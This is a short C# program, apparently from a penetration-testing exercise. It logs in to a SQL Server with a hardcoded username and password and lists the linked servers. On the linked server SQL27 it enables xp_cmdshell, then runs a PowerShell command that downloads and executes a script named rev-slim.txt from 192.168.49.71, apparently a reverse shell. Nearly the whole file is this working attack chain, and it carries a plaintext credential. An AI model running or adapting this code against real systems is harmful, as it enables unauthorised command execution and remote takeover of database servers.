using System;
using System.Data.SqlClient;

namespace sql
{
    class Program
    {
        // .\ConsoleApp1.exe 192.168.49.71
        static void Main(string[] args)
        {

            String sqlServer = "192.168.71.140";
            String database = "music";
            String conString = "Server = " + sqlServer + "; Database = " + database + ";UID=webapp11 ; PWD=89543dfGDFGH4d;";
            SqlConnection con = new SqlConnection(conString);
            try
            {
                con.Open(); Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed"); Environment.Exit(0);
            }

            String execCmd = "EXEC sp_linkedservers;"; 
            SqlCommand command = new SqlCommand(execCmd, con);
            SqlDataReader reader = command.ExecuteReader(); 
            while (reader.Read()) { Console.WriteLine("Linked SQL server: " + reader[0]); }
            reader.Close();

            Console.WriteLine("reconfigure");
            execCmd = "EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; ') AT SQL27";
            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            while (reader.Read()) { Console.WriteLine("Linked SQL server: " + reader[0]); }
            reader.Close();

            Console.WriteLine("cmdshell");
            execCmd = "EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE; ') AT SQL27";
            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            while (reader.Read()) { Console.WriteLine("Linked SQL server: " + reader[0]); }
            reader.Close();

            Console.WriteLine("command");
            //execCmd = "EXEC ('xp_cmdshell cmd /c powershell iex (new-object net.webclient).downloadstring(''''http://192.168.49.71/rev-slim.txt'''')') AT SQL27";
            execCmd = "EXEC ('xp_cmdshell ''cmd /c powershell iex (new-object net.webclient).downloadstring(''''http://192.168.49.71/rev-slim.txt'''')'' ') AT SQL27";
            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            while (reader.Read()) { Console.WriteLine("Linked SQL server: " + reader[0]); }
            reader.Close();

            con.Close();
        }
    }
}
